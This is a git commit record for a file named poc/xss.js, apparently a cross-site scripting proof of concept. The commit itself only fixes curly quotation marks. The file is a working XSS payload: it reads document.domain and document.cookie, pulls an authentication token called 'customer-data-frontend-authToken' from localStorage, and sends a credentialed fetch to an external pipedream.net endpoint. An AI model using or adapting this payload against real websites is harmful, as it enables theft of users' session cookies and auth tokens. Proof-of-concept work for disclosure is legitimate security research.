4bf78b83fe3462449e00025a3a09b8632882fe00
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2023-05-11 01:25:49 +0200

    Update xss.js

--- poc/xss.js
+++ poc/xss.js
@@ -1,4 +1,4 @@
 alert(document.domain);
 console.log(document.cookie);
-console.log(localStorage.getItem(“customer-data-frontend-authToken”));
+console.log(localStorage.getItem("customer-data-frontend-authToken"));
 fetch("https://eolzili6viattmf.m.pipedream.net", { credentials: "include" })
